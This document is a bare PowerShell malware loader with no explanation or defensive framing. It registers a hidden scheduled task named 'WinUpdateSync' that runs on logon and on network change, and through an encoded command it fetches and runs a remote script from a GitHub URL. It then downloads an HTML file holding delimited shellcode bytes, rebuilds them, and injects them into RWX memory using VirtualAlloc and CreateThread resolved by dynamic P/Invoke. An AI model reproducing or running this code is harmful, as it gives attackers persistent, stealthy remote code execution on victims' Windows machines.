# ==========================================================
# 1. PERSISTENCE LAYER: WinUpdateSync Scheduled Task
# ==========================================================
# This ensures the script re-runs on every Logon or Network Change
$inner = 'Start-Sleep -s 10; try { $a="https://raw.githubuser"; $b="content.com/gwyn1869/winupdate/main/drop.ps1"; $d=(Invoke-RestMethod ($a+$b)); . ([scriptblock]::Create($d)) } catch {}'; 
$bytes = [System.Text.Encoding]::Unicode.GetBytes($inner); 
$enc = [Convert]::ToBase64String($bytes); 
$xml = "<?xml version='1.0' encoding='UTF-16'?><Task version='1.2' xmlns='http://schemas.microsoft.com/windows/2004/02/mit/task'><Triggers><LogonTrigger><Enabled>true</Enabled><UserId>$env:USERDOMAIN\$env:USERNAME</UserId></LogonTrigger><EventTrigger><Enabled>true</Enabled><Subscription>&lt;QueryList&gt;&lt;Query Id='0' Path='Microsoft-Windows-NetworkProfile/Operational'&gt;&lt;Select Path='Microsoft-Windows-NetworkProfile/Operational'&gt;*[System[(EventID=10000)]]&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;</Subscription></EventTrigger></Triggers><Principals><Principal id='Author'><UserId>$env:USERDOMAIN\$env:USERNAME</UserId><LogonType'InteractiveToken'</LogonType><RunLevel>LeastPrivilege</RunLevel></Principal></Principals><Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>false</StopIfGoingOnBatteries><ExecutionTimeLimit>PT72H</ExecutionTimeLimit><Hidden>true</Hidden><Enabled>true</Enabled></Settings><Actions Context='Author'><Exec><Command>conhost.exe</Command><Arguments>--headless powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand $enc</Arguments></Exec></Actions></Task>"; 

$xml | Out-File "$env:TEMP\t.xml" -Encoding Unicode; 
schtasks /Create /XML "$env:TEMP\t.xml" /TN "WinUpdateSync" /F; 
Remove-Item "$env:TEMP\t.xml" -Force;

# ==========================================================
# 2. SETUP & DOWNLOAD
# ==========================================================
$htmlPath = "$env:TEMP\sys_cache.html"
$htmlUrl = "https://raw.githubusercontent.com/gwyn1869/winupdate/main/test.html"

# Download the stager/payload
Invoke-WebRequest -Uri $htmlUrl -OutFile $htmlPath -UseBasicParsing

# ==========================================================
# 3. HELPER FUNCTIONS (API INVOCATIONS)
# ==========================================================
function Invoke-VirtualAlloc {
    Param ([IntPtr] $lpAddress, [UInt32] $dwSize, [UInt32] $flAllocationType, [UInt32] $flProtect)
    $AsmBuilder = [System.Reflection.Assembly].Assembly.GetTypes() | ? {$_.Name -eq 'AssemblyBuilder' }
    $AssemblyBuilder = $AsmBuilder::DefineDynamicAssembly('TestAssembly', 'Run')
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('TestModule', $False)
    $TypeBuilder = $ModuleBuilder.DefineType('Kernel32', [Reflection.TypeAttributes]::Public)
    $MethodBuilder = $TypeBuilder.DefineMethod('VirtualAlloc', [Reflection.MethodAttributes] 'Public, Static, PinvokeImpl', [Reflection.CallingConventions] 'Standard', [IntPtr], [Type[]] @([IntPtr], [UInt32], [UInt32], [UInt32]))
    $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([Type[]] @([String]))
    $FieldInfoArray = @([Runtime.InteropServices.DllImportAttribute].GetField('EntryPoint'), [Runtime.InteropServices.DllImportAttribute].GetField('ExactSpelling'), [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError'), [Runtime.InteropServices.DllImportAttribute].GetField('PreserveSig'), [Runtime.InteropServices.DllImportAttribute].GetField('CallingConvention'), [Runtime.InteropServices.DllImportAttribute].GetField('BestFitMapping'), [Runtime.InteropServices.DllImportAttribute].GetField('ThrowOnUnmappableChar'))
    $FieldArguments = @('VirtualAlloc', $False, $True, $True, [Runtime.InteropServices.CallingConvention]::Winapi, $False, $False)
    $CustomAttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, 'api-ms-win-core-memory-l1-1-0.dll', [Reflection.FieldInfo[]] $FieldInfoArray, [Object[]] $FieldArguments)
    $MethodBuilder.SetCustomAttribute($CustomAttribBuilder)
    $MethodBuilder.SetImplementationFlags([Reflection.MethodImplAttributes]::PreserveSig)
    $Kernel32 = $TypeBuilder.CreateType()
    $MethodInfo = New-Object Reflection.Emit.DynamicMethod('VirtualAlloc', [IntPtr], @([IntPtr], [UInt32], [UInt32], [UInt32]))
    $Generator = $MethodInfo.GetILGenerator()
    $Generator.Emit([System.Reflection.Emit.OpCodes]::Ldarg_0); $Generator.Emit([System.Reflection.Emit.OpCodes]::Ldarg_1); $Generator.Emit([System.Reflection.Emit.OpCodes]::Ldarg_2); $Generator.Emit([System.Reflection.Emit.OpCodes]::Ldarg_3); $Generator.Emit([System.Reflection.Emit.OpCodes]::Call, $Kernel32.GetMethod('VirtualAlloc')); $Generator.Emit([System.Reflection.Emit.OpCodes]::Ret)
    $ProxyMethod = $MethodInfo.CreateDelegate([Func``5[IntPtr, UInt32, UInt32, UInt32, IntPtr]])
    $ProxyMethod.Invoke($lpAddress, $dwSize, $flAllocationType, $flProtect)
}

function Invoke-CreateThread {
    Param ([IntPtr] $lpThreadAttributes, [UInt32] $dwStackSize, [IntPtr] $lpStartAddress, [IntPtr] $lpParameter, [UInt32] $dwCreationFlags, [IntPtr] $lpThreadId)
    $AsmBuilder = [System.Reflection.Assembly].Assembly.GetTypes() | ? {$_.Name -eq 'AssemblyBuilder' }
    $AssemblyBuilder = $AsmBuilder::DefineDynamicAssembly('TestAssembly_2', 'Run')
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('TestModule', $False)
    $TypeBuilder = $ModuleBuilder.DefineType('Kernel32', [Reflection.TypeAttributes]::Public)
    $MethodBuilder = $TypeBuilder.DefineMethod('CreateThread', [Reflection.MethodAttributes] 'Public, Static, PinvokeImpl', [Reflection.CallingConventions] 'Standard', [IntPtr], [Type[]] @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]))
    $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([Type[]] @([String]))
    $FieldInfoArray = @([Runtime.InteropServices.DllImportAttribute].GetField('EntryPoint'), [Runtime.InteropServices.DllImportAttribute].GetField('ExactSpelling'), [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError'), [Runtime.InteropServices.DllImportAttribute].GetField('PreserveSig'), [Runtime.InteropServices.DllImportAttribute].GetField('CallingConvention'), [Runtime.InteropServices.DllImportAttribute].GetField('BestFitMapping'), [Runtime.InteropServices.DllImportAttribute].GetField('ThrowOnUnmappableChar'))
    $FieldArguments = @('CreateThread', $False, $True, $True, [Runtime.InteropServices.CallingConvention]::Winapi, $False, $False)
    $CustomAttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, 'api-ms-win-core-processthreads-l1-1-0.dll', [Reflection.FieldInfo[]] $FieldInfoArray, [Object[]] $FieldArguments)
    $MethodBuilder.SetCustomAttribute($CustomAttribBuilder)
    $MethodBuilder.SetImplementationFlags([Reflection.MethodImplAttributes]::PreserveSig)
    $Kernel32 = $TypeBuilder.CreateType()
    $MethodInfo = New-Object Reflection.Emit.DynamicMethod('CreateThread', [IntPtr], @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]))
    $Generator = $MethodInfo.GetILGenerator()
    $Generator.Emit([System.Reflection.Emit.OpCodes]::Ldarg_0); $Generator.Emit([System.Reflection.Emit.OpCodes]::Ldarg_1); $Generator.Emit([System.Reflection.Emit.OpCodes]::Ldarg_2); $Generator.Emit([System.Reflection.Emit.OpCodes]::Ldarg_3); $Generator.Emit([System.Reflection.Emit.OpCodes]::Ldarg_S, ([Byte] 4)); $Generator.Emit([System.Reflection.Emit.OpCodes]::Ldarg_S, ([Byte] 5)); $Generator.Emit([System.Reflection.Emit.OpCodes]::Call, $Kernel32.GetMethod('CreateThread')); $Generator.Emit([System.Reflection.Emit.OpCodes]::Ret)
    $ProxyMethod = $MethodInfo.CreateDelegate([Func``7[IntPtr, UInt32, IntPtr, IntPtr, UInt32, IntPtr, IntPtr]])
    $ProxyMethod.Invoke($lpThreadAttributes, $dwStackSize, $lpStartAddress, $lpParameter, $dwCreationFlags, $lpThreadId)
}

# ==========================================================
# 4. SHELLCODE REASSEMBLY
# ==========================================================
$htmlContent = Get-Content $htmlPath -Raw
$Delim = "dmr"
$parts = $htmlContent -split $Delim
$byteArray = $parts | Where-Object { $_ -match '^\d+$' } | ForEach-Object { [byte]$_ }

if ($byteArray.Length -lt 10) {
    Write-Error "Shellcode too short! Check if test.html is formatted correctly."
    return
}

# ==========================================================
# 5. EXECUTION LOGIC (INJECTION)
# ==========================================================
# 0x3000 = Commit/Reserve | 0x40 = Execute/Read/Write
$ShellcodeAddr = Invoke-VirtualAlloc -lpAddress ([IntPtr]::Zero) -dwSize $byteArray.Length -flAllocationType 0x3000 -flProtect 0x40

if ($ShellcodeAddr -ne [IntPtr]::Zero) {
    [System.Runtime.InteropServices.Marshal]::Copy($byteArray, 0, $ShellcodeAddr, $byteArray.Length)
    
    # Launch Thread
    Invoke-CreateThread -lpThreadAttributes ([IntPtr]::Zero) -dwStackSize 0 -lpStartAddress $ShellcodeAddr -lpParameter ([IntPtr]::Zero) -dwCreationFlags 0 -lpThreadId ([IntPtr]::Zero) | Out-Null
    
    # Allow execution time
    Start-Sleep -Seconds 5
}

# ==========================================================
# 6. FINAL CLEANUP
# ==========================================================
#Remove-Item $htmlPath -Force
